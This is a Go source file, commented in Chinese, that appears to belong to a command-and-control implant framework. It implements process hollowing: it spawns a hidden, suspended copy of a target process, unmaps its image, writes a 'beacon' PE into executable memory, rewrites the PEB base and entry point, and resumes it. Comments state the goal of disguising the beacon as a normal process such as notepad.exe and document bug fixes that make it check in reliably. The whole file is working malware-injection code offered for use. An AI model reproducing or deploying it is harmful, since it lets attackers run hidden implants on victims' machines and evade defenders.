//go:build windows

package commands

import (
	"time"
	"bytes"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"syscall"
	"unsafe"
)

// ===== A10: Process Hollowing（进程镂空） =====
// 以目标进程的镜像路径创建新进程（CREATE_SUSPENDED），卸载其原镜像，
// 写入完整 beacon PE，改入口点后恢复执行--beacon 作为"正常进程"运行，
// Go runtime 正常初始化 -> 可靠上线（进程名伪装为目标进程，如 notepad.exe）。
// 不触碰原目标进程（不会崩溃/蓝屏）。
//
// 与 donut 远程线程反射加载相比：完整 Go PE 反射加载到远程进程不可靠（Go runtime
// 依赖正常进程初始化），hollow 以新进程加载规避了该问题。

type peSectionInfo struct {
	virtualAddress uint32
	rawSize        uint32
	data           []byte
}

type peImageInfo struct {
	imageBase           uintptr
	sizeOfImage         uint32
	addressOfEntryPoint uint32
	sizeOfHeaders       uint32
	sections            []peSectionInfo
}

// ProcessHollow 进程镂空：注入完整 beacon PE，以目标 pid 的镜像路径创建新进程运行。
//
// 【关键机制】CREATE_SUSPENDED 子进程恢复执行时，loader 初始化 APC（LdrInitializeThunk）
// 先于用户入口运行，并以 PEB->ImageBaseAddress 定位主镜像：解析导入表(IAT)、注册
// .pdata 异常表、必要时应用重定位。因此镂空的正确顺序是：
//  1. 从子进程 PEB 读取原镜像【实际】基址（ASLR 下 ≠ 文件 preferred base）并卸载之；
//  2. 分配 beacon（优先 preferred base，回退任意地址，.reloc 交由 loader 重定位）；
//  3. 【无条件】把 PEB->ImageBaseAddress 更新为 beacon 实际基址；
//  4. 写 PE 头 + 各节，改主线程 RIP = 实际基址 + 入口 RVA，ResumeThread。
//
// 历史缺陷（已修）：曾用 beacon preferred ImageBase(0x140000000) 做卸载、且仅在分配
// 地址 != preferred base 时才更新 PEB -- ASLR 目标(如 notepad)原镜像在随机基址，
// 卸载失败原镜像残留，loader 初始化的是原镜像而非 beacon，beacon IAT 未解析、
// Go runtime 首次经 IAT 调 kernel32 即崩溃 -> 注入报成功但永远不上线。
func ProcessHollow(pid int, peData []byte) error {
	if len(peData) < 2 || peData[0] != 'M' || peData[1] != 'Z' {
		return errors.New("载荷不是有效 PE（缺 MZ 头）")
	}
	imgPath, err := getProcessImagePath(pid)
	if err != nil {
		return fmt.Errorf("读取目标进程路径失败: %v", err)
	}
	info, err := parsePEImage(peData)
	if err != nil {
		return err
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createProcessW := kernel32.NewProc("CreateProcessW")
	getThreadContext := kernel32.NewProc("GetThreadContext")
	setThreadContext := kernel32.NewProc("SetThreadContext")
	resumeThread := kernel32.NewProc("ResumeThread")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	readProcessMemory := kernel32.NewProc("ReadProcessMemory")
	isWow64Process := kernel32.NewProc("IsWow64Process")
	getExitCodeProcess := kernel32.NewProc("GetExitCodeProcess")
	closeHandle := kernel32.NewProc("CloseHandle")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	ntUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	// 1. CreateProcessW 挂起创建新进程（同路径 -> 进程名伪装为目标进程）
	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x00000001 // STARTF_USESHOWWINDOW
	si.ShowWindow = 0     // SW_HIDE
	var pi syscall.ProcessInformation
	appPtr, _ := syscall.UTF16PtrFromString(imgPath)
	const createSuspended = 0x08000000
	r, _, _ := createProcessW.Call(
		uintptr(unsafe.Pointer(appPtr)), 0, 0, 0, 0,
		createSuspended, 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if r == 0 {
		return fmt.Errorf("CreateProcessW(%s) 失败", imgPath)
	}
	defer closeHandle.Call(uintptr(pi.Thread))
	defer closeHandle.Call(uintptr(pi.Process))

	// 1.5 位数校验：64 位 beacon 镂空进 32 位(Wow64)子进程必然崩溃，提前拒绝
	var childWow64 uint32
	if r, _, _ := isWow64Process.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&childWow64))); r != 0 && childWow64 != 0 {
		return errors.New("目标进程为 32 位(Wow64)，镂空注入仅支持 64 位目标进程，请选择 64 位目标")
	}

	// 2. 读取子进程 PEB 中的原镜像实际基址（ASLR 随机化后与 preferred base 不同）
	//    并卸载该基址上的原镜像。PROCESS_BASIC_INFORMATION x64: PebBaseAddress 在 +0x8。
	var pbi [6]uintptr
	st, _, _ := ntQueryInformationProcess.Call(uintptr(pi.Process), 0,
		uintptr(unsafe.Pointer(&pbi[0])), uintptr(unsafe.Sizeof(pbi)), 0)
	if st != 0 || pbi[1] == 0 {
		return fmt.Errorf("读取子进程 PEB 失败 (status=0x%x)", st)
	}
	pebAddr := pbi[1]
	var origBase uintptr
	var nRead uintptr
	if r, _, _ := readProcessMemory.Call(uintptr(pi.Process), pebAddr+0x10,
		uintptr(unsafe.Pointer(&origBase)), 8, uintptr(unsafe.Pointer(&nRead))); r == 0 || nRead != 8 {
		return errors.New("读取原镜像基址失败")
	}

	var unmapStatus uintptr
	if unmapStatus, _, _ = ntUnmapViewOfSection.Call(uintptr(pi.Process), origBase); unmapStatus != 0 {
		// 极少见：读到的基址未被映射。继续，尝试在 beacon preferred base 分配
	}

	// 3. 在 beacon preferred ImageBase 分配 RWX（Go runtime 运行期自管页保护）
	var allocAtAddr uintptr
	allocAtAddr, _, _ = virtualAllocEx.Call(
		uintptr(pi.Process), info.imageBase,
		uintptr(info.sizeOfImage),
		0x3000, // MEM_COMMIT|MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	addr := allocAtAddr
	if addr == 0 {
		// 目标基址被占：回退任意地址（beacon 带 .reloc，loader 会按 PEB 基址重定位）
		addr, _, _ = virtualAllocEx.Call(
			uintptr(pi.Process), 0,
			uintptr(info.sizeOfImage),
			0x3000, 0x40,
		)
		if addr == 0 {
			return fmt.Errorf("VirtualAllocEx 失败 (unmap=0x%x)", unmapStatus)
		}
	}

	// 4. 无条件更新 PEB->ImageBaseAddress = beacon 实际基址：
	//    loader 初始化 APC 以该字段定位主镜像，解析 IAT / 注册异常表 / 重定位。
	if r, _, _ := writeProcessMemory.Call(uintptr(pi.Process), pebAddr+0x10,
		uintptr(unsafe.Pointer(&addr)), 8, uintptr(unsafe.Pointer(&nRead))); r == 0 {
		return errors.New("更新 PEB ImageBaseAddress 失败")
	}

	// 5. 写 PE 头 + 各节
	var written uintptr
	r, _, _ = writeProcessMemory.Call(
		uintptr(pi.Process), addr,
		uintptr(unsafe.Pointer(&peData[0])),
		uintptr(info.sizeOfHeaders),
		uintptr(unsafe.Pointer(&written)))
	if r == 0 {
		return fmt.Errorf("写 PE 头失败 (unmap=0x%x)", unmapStatus)
	}
	for _, sec := range info.sections {
		if len(sec.data) == 0 {
			continue
		}
		dst := addr + uintptr(sec.virtualAddress)
		var w uintptr
		r, _, _ = writeProcessMemory.Call(
			uintptr(pi.Process), dst,
			uintptr(unsafe.Pointer(&sec.data[0])),
			uintptr(len(sec.data)),
			uintptr(unsafe.Pointer(&w)))
		if r == 0 {
			return fmt.Errorf("写节失败 va=0x%x (unmap=0x%x)", sec.virtualAddress, unmapStatus)
		}
	}

	// 6. 设置主线程入口点 RIP = 实际基址 + AddressOfEntryPoint
	//    x64 CONTEXT: ContextFlags@0x30, Rip@0xF8；结构要求 16 字节对齐
	//    （Go 分配仅保证 8 字节，未对齐会偶发 GetThreadContext 失败/上下文损坏）
	ctxRaw := make([]byte, 0x4D0+16)
	align := int((16 - (uintptr(unsafe.Pointer(&ctxRaw[0])) & 15)) & 15)
	ctx := ctxRaw[align : align+0x4D0]
	binary.LittleEndian.PutUint32(ctx[0x30:], 0x00100007) // CONTEXT_AMD64 | CONTEXT_FULL (0x10007)
	r, _, _ = getThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))
	if r == 0 {
		return errors.New("GetThreadContext 失败")
	}
	entry := uint64(addr) + uint64(info.addressOfEntryPoint)
	binary.LittleEndian.PutUint64(ctx[0xF8:], entry)
	if r, _, _ = setThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0]))); r == 0 {
		return errors.New("SetThreadContext 失败")
	}

	// 7. 恢复执行 -> loader 先初始化 beacon（IAT/异常表/重定位），随后进入 beacon 入口
	var resumeRet uintptr
	if resumeRet, _, _ = resumeThread.Call(uintptr(pi.Thread)); resumeRet == 0xFFFFFFFF {
		return errors.New("ResumeThread 失败")
	}

	// 诊断：短暂等待后读取新进程退出码（259=STILL_ACTIVE 运行中；否则为崩溃退出码）
	time.Sleep(1500 * time.Millisecond)
	var exitCode uint32
	if r, _, _ = getExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode))); r != 0 {
		hollowLastResult = fmt.Sprintf("origBase=0x%x unmap=0x%x alloc=0x%x pref=0x%x entry=0x%x exit=0x%x alive=%v",
			origBase, unmapStatus, addr, info.imageBase, info.addressOfEntryPoint, exitCode, exitCode == 259)
		if exitCode != 259 {
			// 注入操作本身成功但 beacon 启动即崩溃：显式报错（而非假成功），
			// 把退出码带回控制台便于定位（0xC0000005=IAT/重定位问题）
			return fmt.Errorf("beacon 进程启动后即退出 (exit=0x%x)：%s", exitCode, hollowLastResult)
		}
	} else {
		hollowLastResult = fmt.Sprintf("origBase=0x%x unmap=0x%x alloc=0x%x pref=0x%x entry=0x%x exit=GetExitCodeFailed",
			origBase, unmapStatus, addr, info.imageBase, info.addressOfEntryPoint)
	}
	return nil
}

// hollowLastResult 保存最近一次 hollow 的诊断信息（供回包展示）
var hollowLastResult string

// SetHollowDiag 由 CmdInjectMem 调用获取 hollow 诊断
func SetHollowDiag(d string) { hollowLastResult = d }

// GetHollowDiag 返回 hollow 诊断
func GetHollowDiag() string { return hollowLastResult }

// getProcessImagePath 读取指定 PID 进程的镜像路径（QueryFullProcessImageNameW）。
func getProcessImagePath(pid int) (string, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	openProcess := kernel32.NewProc("OpenProcess")
	queryFullProcessImageName := kernel32.NewProc("QueryFullProcessImageNameW")
	closeHandle := kernel32.NewProc("CloseHandle")

	const processQueryLimitedInformation = 0x1000
	h, _, _ := openProcess.Call(processQueryLimitedInformation, 0, uintptr(pid))
	if h == 0 {
		return "", fmt.Errorf("OpenProcess(%d) 失败", pid)
	}
	defer closeHandle.Call(h)

	buf := make([]uint16, 1024)
	size := uint32(len(buf))
	r, _, _ := queryFullProcessImageName.Call(
		h, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return "", fmt.Errorf("QueryFullProcessImageName 失败")
	}
	return syscall.UTF16ToString(buf[:size]), nil
}

// parsePEImage 解析 64 位 PE 的关键字段（ImageBase/SizeOfImage/入口/节表）。
func parsePEImage(data []byte) (*peImageInfo, error) {
	f, err := pe.NewFile(bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("解析 PE 失败: %v", err)
	}
	opt64, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return nil, errors.New("非 64 位 PE（hollow 仅支持 x64 beacon）")
	}
	info := &peImageInfo{
		imageBase:           uintptr(opt64.ImageBase),
		sizeOfImage:         opt64.SizeOfImage,
		addressOfEntryPoint: opt64.AddressOfEntryPoint,
		sizeOfHeaders:       opt64.SizeOfHeaders,
	}
	if info.sizeOfImage == 0 || info.sizeOfHeaders == 0 {
		return nil, errors.New("PE 尺寸字段无效")
	}
	for _, s := range f.Sections {
		secData, _ := s.Data()
		info.sections = append(info.sections, peSectionInfo{
			virtualAddress: s.VirtualAddress,
			rawSize:        s.Size,
			data:           secData,
		})
	}
	return info, nil
}
